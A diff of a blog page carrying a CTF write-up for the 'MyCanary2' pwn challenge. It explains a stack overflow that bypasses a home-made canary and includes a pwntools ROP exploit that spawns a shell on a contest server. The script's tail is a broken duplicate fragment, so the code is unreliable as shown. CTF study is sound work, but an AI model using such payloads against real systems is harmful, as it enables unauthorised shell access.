@@ -30,164 +30,28 @@ if (window.localStorage.getItem('theme-mode') === 'dark')
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 }</style><style>:root {
-  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --dark-background: url('/img/hope.jpg');
   --light-background: url('/img/bk.jpg');
-}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>DASCTF2022七月赋能赛 MyCanary2</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-07-27T17:20:00.000Z" id="date"> 2022-07-28</time></div></span></div></div><hr><div id="post-content"><h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><ul>
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>DASCTF2022七月赋能赛 MyCanary2</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-07-27T17:20:00.000Z" id="date"> 2022-07-28</time></div></span></div></div><hr><div id="post-content"><h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><ul>
 <li>sub_4012B6()</li>
 </ul>
-<pre><code class="c">unsigned int sub_4012B6()
-&#123;
-  int v0; // eax
-  int fd; // [rsp+Ch] [rbp-4h]
-
-  setbuf(stdin, 0LL);
-  setbuf(stdout, 0LL);
-  setbuf(stderr, 0LL);
-  fd = open(&quot;/dev/urandom&quot;, 0);
-  if ( fd == -1 )
-  &#123;
-    printf(&quot;can&#39;t open /dev/urandom&quot;);
-    exit(-1);
-  &#125;
-  read(fd, &amp;qword_4040D0, 8uLL);
-  close(fd);
-  v0 = time(0LL);
-  srand(v0 ^ qword_4040D0);
-  return alarm(0x14u);
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_4012B6</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd == <span class="hljs-number">-1</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can&#x27;t open /dev/urandom&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  read(fd, &amp;qword_4040D0, <span class="hljs-number">8uLL</span>);<br>  close(fd);<br>  v0 = time(<span class="hljs-number">0LL</span>);<br>  srand(v0 ^ qword_4040D0);<br>  <span class="hljs-keyword">return</span> alarm(<span class="hljs-number">0x14</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>这里通过time()时间戳和<code>qword_4040D0</code>作为seed，进行一个随机数的生成</p>
 <ul>
 <li>sub_4013EC()</li>
 </ul>
-<pre><code class="c">__int64 sub_4013EC()
-&#123;
-  __int64 result; // rax
-  char buf[88]; // [rsp+0h] [rbp-70h] BYREF
-  __int64 v2; // [rsp+58h] [rbp-18h]
-  int v3; // [rsp+68h] [rbp-8h]
-  int v4; // [rsp+6Ch] [rbp-4h]
-
-  v4 = 0;
-  qword_4040D0 = (__int64)rand() &lt;&lt; 32;
-  qword_4040D0 += rand();
-  v2 = qword_4040D0;
-  puts(&quot;I have a secret. Can you find it?&quot;);
-  while ( !v4 )
-  &#123;
-    sub_401381();
-    v3 = READ();
-    switch ( v3 )
-    &#123;
-      case 2:
-        printf(&quot;My secret is %016lx\n&quot;, qword_4040D0);
-        qword_4040D0 = (__int64)rand() &lt;&lt; 32;
-        qword_4040D0 += rand();
-        v2 = qword_4040D0;
-        printf(&quot;But now, I have a new Secret.&quot;);
-        break;
-      case 3:
-        v4 = 1;
-        break;
-      case 1:
-        puts(&quot;Show me the code:&quot;);
-        read(0, buf, 0x100uLL);
-        break;
-    &#125;
-  &#125;
-  result = qword_4040D0;
-  if ( v2 != qword_4040D0 )
-  &#123;
-    printf(&quot;Hey, What are you doing?&quot;);
-    exit(0);
-  &#125;
-  return result;
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_4013EC</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">88</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span><br>  __int64 v2; <span class="hljs-comment">// [rsp+58h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+6Ch] [rbp-4h]</span><br><br>  v4 = <span class="hljs-number">0</span>;<br>  qword_4040D0 = (__int64)rand() &lt;&lt; <span class="hljs-number">32</span>;<br>  qword_4040D0 += rand();<br>  v2 = qword_4040D0;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I have a secret. Can you find it?&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( !v4 )<br>  &#123;<br>    sub_401381();<br>    v3 = READ();<br>    <span class="hljs-keyword">switch</span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;My secret is %016lx\n&quot;</span>, qword_4040D0);<br>        qword_4040D0 = (__int64)rand() &lt;&lt; <span class="hljs-number">32</span>;<br>        qword_4040D0 += rand();<br>        v2 = qword_4040D0;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;But now, I have a new Secret.&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        v4 = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Show me the code:&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  result = qword_4040D0;<br>  <span class="hljs-keyword">if</span> ( v2 != qword_4040D0 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey, What are you doing?&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>case2:输出<code>qword_4040D0</code>，并且将rand()生成的随机数值左移运算32后赋给<code>qword_4040D0</code>，接着再加上一个随机数值，将<code>qword_4040D0</code>赋给v2，这个v2就起到一个canary的作用</p>
 <p>case1:stackoverflow</p>
 <p>程序退出前检查v2的值是否被改动过，如果与之前不等，则crash掉</p>
-<pre><code class="c">.text:0000000000401573 ; __unwind &#123;
-.text:0000000000401573                 endbr64
-.text:0000000000401577                 push    rbp
-.text:0000000000401578                 mov     rbp, rsp
-.text:000000000040157B                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;
-.text:0000000000401582                 call    _system
-.text:0000000000401587                 nop
-.text:0000000000401588                 pop     rbp
-.text:0000000000401589                 retn
-.text:0000000000401589 ; &#125; // starts at 401573
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401573</span> ; __unwind &#123;<br>.text:<span class="hljs-number">0000000000401573</span>                 endbr64<br>.text:<span class="hljs-number">0000000000401577</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401578</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">000000000040157B</span>                 lea     rdi, aBinSh     ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">0000000000401582</span>                 call    _system<br>.text:<span class="hljs-number">0000000000401587</span>                 nop<br>.text:<span class="hljs-number">0000000000401588</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401589</span>                 retn<br>.text:<span class="hljs-number">0000000000401589</span> ; &#125; <span class="hljs-comment">// starts at 401573</span><br></code></pre></td></tr></table></figure>
 <p>程序有后门函数，我们可以利用<code>/bin/sh</code></p>
-<pre><code class="c">-0000000000000070 buf             db 88 dup(?)
--0000000000000018 anonymous_0     dq ?              //v2
--0000000000000010                 db ? ; undefined
--000000000000000F                 db ? ; undefined
--000000000000000E                 db ? ; undefined
--000000000000000D                 db ? ; undefined
--000000000000000C                 db ? ; undefined
--000000000000000B                 db ? ; undefined
--000000000000000A                 db ? ; undefined
--0000000000000009                 db ? ; undefined
--0000000000000008 var_8           dd ?             //v4
--0000000000000004 var_4           dd ?
-+0000000000000000  s              db 8 dup(?)
-+0000000000000008  r              db 8 dup(?)
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-0000000000000070</span> buf             db <span class="hljs-number">88</span> dup(?)<br><span class="hljs-number">-0000000000000018</span> anonymous_0     dq ?              <span class="hljs-comment">//v2</span><br><span class="hljs-number">-0000000000000010</span>                 db ? ; undefined<br><span class="hljs-number">-000000000000000F</span>                 db ? ; undefined<br><span class="hljs-number">-000000000000000</span>E                 db ? ; undefined<br><span class="hljs-number">-000000000000000</span>D                 db ? ; undefined<br><span class="hljs-number">-000000000000000</span>C                 db ? ; undefined<br><span class="hljs-number">-000000000000000B</span>                 db ? ; undefined<br><span class="hljs-number">-000000000000000</span>A                 db ? ; undefined<br><span class="hljs-number">-0000000000000009</span>                 db ? ; undefined<br><span class="hljs-number">-0000000000000008</span> var_8           dd ?             <span class="hljs-comment">//v4</span><br><span class="hljs-number">-0000000000000004</span> var_4           dd ?<br>+<span class="hljs-number">0000000000000000</span>  s              db <span class="hljs-number">8</span> dup(?)<br>+<span class="hljs-number">0000000000000008</span>  r              db <span class="hljs-number">8</span> dup(?)<br></code></pre></td></tr></table></figure>
 <p>栈的一个分布，v2在buf的下方，我们在利用stackoverflow的时候会将v2覆盖掉，这样退出程序必然会crash</p>
-<p>逻辑漏洞：如果我们先利用stackoverflow漏洞，ROP，调用system，构造system(“&#x2F;bin&#x2F;sh”)，再采用case2来生成canary，<code>qword_4040D0</code>的值会被赋给v2，这样虽然刚才v2被覆盖掉，但是现在已经是新生成的canary的值了，退出程序不会crash</p>
+<p>逻辑漏洞：如果我们先利用stackoverflow漏洞，ROP，调用system，构造system(“/bin/sh”)，再采用case2来生成canary，<code>qword_4040D0</code>的值会被赋给v2，这样虽然刚才v2被覆盖掉，但是现在已经是新生成的canary的值了，退出程序不会crash</p>
 <p><del>刚拿到这道题的时候我在预测canary的值，没想到这么简单</del></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">&#39;&#39;&#39;
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-&#39;&#39;&#39;
-from pwn import *
-import ctypes
-context(os = &quot;linux&quot; , arch = &quot;amd64&quot; , log_level = &quot;debug&quot;)
-elf_path = &quot;/mnt/c/Users/M1sceden4/Desktop/MyCanary2/tempdir/PWN附件/MyCanary2&quot;
-libc_func = ctypes.CDLL(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
-local = int(input(&quot;0 for remote , 1 for local:\t&quot;))
-host = &quot;node4.buuoj.cn&quot;
-port = 28118
-if local == 1:
-    io = process(elf_path)
-elif local == 0:
-    io = remote(host , port)
-pop_rdi = 0x401613
-ret = 0x40101a
-elf = ELF(elf_path)
-# io.recvuntil(&quot;Input your choice\n&quot;)
-# io.sendline(&quot;2&quot;)
-# io.recvuntil(&quot;My secret is &quot;)
-# qword_4040D0 = (io.recv(16)).decode()
-
-
-# success(&quot;get qword_4040D0 : %s&quot; % qword_4040D0)
-# time = libc_func.time(0)
-
-# libc_func.srand((time) ^ (qword_4040D0))
-# new_secret = libc_func.rand() + (libc_func.rand() &lt;&lt; 32)
-# print(new_secret)
-io.recvuntil(&quot;Input your choice\n&quot;)
-io.sendline(&#39;1&#39;)
-io.recvuntil(&quot;Show me the code:\n&quot;)
-bin_sh = next(elf.search(b&quot;/bin/sh&quot;))
-success(&#39;got binsh -&gt; %s&#39; % hex(bin_sh))
-payload = b&#39;a&#39; * 0x68 + p32(1) + p32(0) + p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(elf.plt[&#39;system&#39;])
-
-io.sendline(payload)
-io.recvuntil(&quot;Input your choice\n&quot;)
-io.sendline(&quot;2&quot;)
-io.recvuntil(&quot;Input your choice\n&quot;)
-io.sendline(&quot;3&quot;)
-io.interactive()hoice\n&quot;)
-io.sendline(&quot;3&quot;)
-io.interactive()
-</code></pre>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/07/28/get-started-3dsctf-2016/">← 下一篇 get_started_3dsctf_2016</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/07/26/DASCTF2022%E4%B8%83%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9B-eyfor/">DASCTF2022七月赋能赛 eyfor 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Mykonos</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/Mykonos-x"><i class="fab fa-github" alt="Github"></i></a><a class="social" href="g0dzirrazhou@gmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyse"><span class="toc-number">1.</span> <span class="toc-text">Analyse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x400000)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br>context(os = <span class="hljs-string">&quot;linux&quot;</span> , arch = <span class="hljs-string">&quot;amd64&quot;</span> , log_level = <span class="hljs-string">&quot;debug&quot;</span>)<br>elf_path = <span class="hljs-string">&quot;/mnt/c/Users/M1sceden4/Desktop/MyCanary2/tempdir/PWN附件/MyCanary2&quot;</span><br>libc_func = ctypes.CDLL(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>local = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;0 for remote , 1 for local:\t&quot;</span>))<br>host = <span class="hljs-string">&quot;node4.buuoj.cn&quot;</span><br>port = <span class="hljs-number">28118</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(elf_path)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">0</span>:<br>    io = remote(host , port)<br>pop_rdi = <span class="hljs-number">0x401613</span><br>ret = <span class="hljs-number">0x40101a</span><br>elf = ELF(elf_path)<br><span class="hljs-comment"># io.recvuntil(&quot;Input your choice\n&quot;)</span><br><span class="hljs-comment"># io.sendline(&quot;2&quot;)</span><br><span class="hljs-comment"># io.recvuntil(&quot;My secret is &quot;)</span><br><span class="hljs-comment"># qword_4040D0 = (io.recv(16)).decode()</span><br><br><br><span class="hljs-comment"># success(&quot;get qword_4040D0 : %s&quot; % qword_4040D0)</span><br><span class="hljs-comment"># time = libc_func.time(0)</span><br><br><span class="hljs-comment"># libc_func.srand((time) ^ (qword_4040D0))</span><br><span class="hljs-comment"># new_secret = libc_func.rand() + (libc_func.rand() &lt;&lt; 32)</span><br><span class="hljs-comment"># print(new_secret)</span><br>io.recvuntil(<span class="hljs-string">&quot;Input your choice\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Show me the code:\n&quot;</span>)<br>bin_sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>success(<span class="hljs-string">&#x27;got binsh -&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(bin_sh))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x68</span> + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>io.sendline(payload)<br>io.recvuntil(<span class="hljs-string">&quot;Input your choice\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Input your choice\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>io.interactive()hoice\n<span class="hljs-string">&quot;)</span><br><span class="hljs-string">io.sendline(&quot;</span><span class="hljs-number">3</span><span class="hljs-string">&quot;)</span><br><span class="hljs-string">io.interactive()</span><br></code></pre></td></tr></table></figure>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/07/28/get-started-3dsctf-2016/">← 下一篇 get_started_3dsctf_2016</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/07/26/DASCTF2022%E4%B8%83%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9B-eyfor/">DASCTF2022七月赋能赛 eyfor 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Mykonos</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/Mykonos-x"><i class="fab fa-github" alt="Github"></i></a><a class="social" href="g0dzirrazhou@gmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyse"><span class="toc-number">1.</span> <span class="toc-text">Analyse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
 lightGallery(document.getElementById('post-bg'), {
   plugins: [lgZoom,lgThumbnail],
   selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
